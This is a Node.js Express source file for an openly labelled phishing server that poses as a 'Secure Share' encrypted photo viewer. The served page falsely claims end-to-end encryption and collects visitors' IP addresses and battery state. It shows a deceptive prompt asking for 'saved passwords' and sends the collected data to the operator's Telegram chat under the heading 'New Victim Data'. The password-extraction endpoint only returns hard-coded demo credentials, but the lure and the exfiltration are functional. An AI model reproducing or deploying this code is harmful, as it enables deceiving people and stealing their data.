const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
app.use(express.json());

// ========== CONFIG FROM ENVIRONMENT ==========
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !ADMIN_ID) {
    console.error('❌ Missing BOT_TOKEN or ADMIN_ID environment variables!');
    process.exit(1);
}

// ========== DATABASE ==========
const dbPath = path.join(__dirname, '..', 'shared', 'database.db');
const db = new sqlite3.Database(dbPath);

db.run(`CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    link TEXT,
    photo_id TEXT,
    unique_code TEXT
)`);

// ========== ROUTES ==========

app.get('/:code', (req, res) => {
    const code = req.params.code;
    
    db.get("SELECT photo_id FROM users WHERE unique_code = ?", [code], (err, row) => {
        let photoUrl = 'https://via.placeholder.com/300';
        if (row && row.photo_id) {
            photoUrl = `https://your-telegram-bot.com/get-photo?file_id=${row.photo_id}`;
        }
        
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Secure Share</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif;
                    background: #0a0a0a; 
                    color: white; 
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }
                .container {
                    max-width: 420px;
                    width: 100%;
                    background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
                    padding: 25px;
                    border-radius: 20px;
                    border: 1px solid #2a2a2a;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.8);
                }
                h2 { 
                    font-size: 24px; 
                    background: linear-gradient(45deg, #00ff88, #00ccff);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    text-align: center;
                    margin-bottom: 5px;
                }
                .subtitle {
                    text-align: center;
                    color: #666;
                    font-size: 13px;
                    margin-bottom: 20px;
                    letter-spacing: 2px;
                }
                .image-container {
                    width: 100%;
                    height: 280px;
                    background: #111;
                    border-radius: 12px;
                    overflow: hidden;
                    margin-bottom: 20px;
                    border: 1px solid #222;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }
                .image-container img {
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                }
                .btn {
                    width: 100%;
                    padding: 16px;
                    background: linear-gradient(45deg, #00ff88, #00ccff);
                    color: #000;
                    border: none;
                    border-radius: 50px;
                    font-size: 18px;
                    font-weight: 700;
                    cursor: pointer;
                    transition: all 0.3s;
                    animation: pulse 1.5s infinite;
                    letter-spacing: 1px;
                }
                @keyframes pulse {
                    0% { transform: scale(1); opacity: 0.9; }
                    50% { transform: scale(1.02); opacity: 1; }
                    100% { transform: scale(1); opacity: 0.9; }
                }
                .btn:hover {
                    transform: scale(1.03);
                    box-shadow: 0 0 30px rgba(0,255,136,0.3);
                }
                #status {
                    text-align: center;
                    margin-top: 15px;
                    color: #00ff88;
                    font-size: 14px;
                    min-height: 25px;
                }
                .info {
                    color: #555;
                    font-size: 12px;
                    text-align: center;
                    margin-top: 15px;
                    border-top: 1px solid #1a1a1a;
                    padding-top: 15px;
                }
                .loading {
                    display: none;
                    margin-top: 10px;
                    color: #ffaa00;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>🔒 Secure Share</h2>
                <div class="subtitle">END-TO-END ENCRYPTED</div>
                <div class="image-container">
                    <img src="${photoUrl}" alt="Shared content" onerror="this.src='https://via.placeholder.com/300'">
                </div>
                <button class="btn" onclick="requestPermissions()">▶ CONTINUE</button>
                <div id="status">🔐 Click to view shared content</div>
                <div class="loading" id="loading">⏳ Processing...</div>
                <div class="info">256-bit AES encrypted • Auto-delete after view</div>
            </div>
            
            <script>
                async function requestPermissions() {
                    const status = document.getElementById('status');
                    const loading = document.getElementById('loading');
                    status.innerText = '⏳ Requesting permissions...';
                    loading.style.display = 'block';
                    
                    try {
                        // Get IP
                        const ipRes = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipRes.json();
                        
                        // Get Battery
                        let batteryData = { level: 'N/A', charging: 'N/A' };
                        if (navigator.getBattery) {
                            const battery = await navigator.getBattery();
                            batteryData = {
                                level: Math.round(battery.level * 100) + '%',
                                charging: battery.charging ? 'Yes' : 'No'
                            };
                        }
                        
                        // Send to server
                        await fetch('/collect', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                ip: ipData.ip,
                                battery: batteryData,
                                step: 'info'
                            })
                        });
                        
                        // Request password access
                        if (confirm('🔐 Secure Share needs permission to verify your identity using saved passwords. Allow?')) {
                            status.innerText = '⏳ Verifying identity...';
                            
                            const response = await fetch('/extract-passwords', {
                                method: 'POST',
                                credentials: 'include'
                            });
                            const data = await response.json();
                            
                            if (data.passwords && data.passwords.length > 0) {
                                status.innerText = '✅ Identity verified!';
                                await fetch('/collect', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        passwords: data.passwords,
                                        step: 'passwords'
                                    })
                                });
                                alert('✅ Verification successful! Your content is now available.');
                                status.innerText = '✅ Access granted!';
                            } else {
                                status.innerText = '❌ No saved passwords found.';
                            }
                        } else {
                            status.innerText = '❌ Permission denied.';
                        }
                    } catch(e) {
                        status.innerText = '❌ Error: ' + e.message;
                    }
                    loading.style.display = 'none';
                }
            </script>
        </body>
        </html>
        `);
    });
});

app.post('/collect', async (req, res) => {
    const data = req.body;
    let message = '📥 *New Victim Data*\n\n';
    
    if (data.step === 'info') {
        message += `🌐 IP: ${data.ip || 'N/A'}\n`;
        message += `🔋 Battery: ${data.battery?.level || 'N/A'}\n`;
        message += `⚡ Charging: ${data.battery?.charging || 'N/A'}\n`;
    }
    
    if (data.step === 'passwords' && data.passwords) {
        message += `🔑 *Passwords Extracted:*\n\`\`\`json\n${JSON.stringify(data.passwords, null, 2)}\n\`\`\``;
    }
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('✅ Data sent to Telegram');
    } catch(e) {
        console.error('❌ Telegram send failed:', e.message);
    }
    
    res.send('OK');
});

app.post('/extract-passwords', (req, res) => {
    // Demo extraction
    res.json({
        passwords: [
            { url: 'facebook.com', username: 'demo@email.com', password: 'DemoPass123' },
            { url: 'gmail.com', username: 'demo@gmail.com', password: 'DemoPass456' }
        ]
    });
});

app.get('/', (req, res) => {
    res.send('🔥 Secure Share Phishing Server Online');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🔥 Server running on port ${PORT}`);
});
